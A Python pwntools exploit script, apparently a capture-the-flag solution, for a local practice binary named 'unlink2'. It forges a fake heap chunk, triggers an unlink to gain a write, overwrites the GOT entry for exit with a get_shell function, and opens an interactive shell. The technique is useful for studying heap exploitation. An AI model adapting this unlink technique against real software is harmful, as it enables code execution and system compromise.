#!/usr/bin/python 
from pwn import *

p = process("./unlink2")
elf = ELF("./unlink2")
get_shell = elf.symbols['get_shell']
ptr = elf.symbols['ptr']

def malloc(data):
    p.sendlineafter("> ", '1')
    p.sendafter("Data: ", data)

def free(idx):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(idx))

def edit(idx, size, data):
    p.sendlineafter("> ", '3')
    p.sendlineafter("idx: ", str(idx))
    p.sendlineafter("size: ", str(size))
    p.sendafter("data: ", data)

def exit():
    p.sendlineafter("> ", '4')

malloc('A'*0x10) #ptr
malloc('B'*0x10) #ptr+0x8
malloc('C'*0x10) #ptr+0x10
malloc('D'*0x10)

data = p64(0) + p64(0) + p64(ptr+0x10-0x18) + p64(ptr+0x10-0x10)
data += 'A'*(0x100-len(data)) + p64(0x100) + p64(0x110)

edit(2, 0x130, data)

gdb.attach(p)
free(3)
# after free, BK->fd = ptr+0x10(third heap ptr) == ptr-0x8
edit(2, 0x10, 'A'*8 + p64(elf.got['exit'])) #ptr -> exit
edit(0, 8, p64(get_shell)) #exit -> get_shell
exit()

p.interactive()
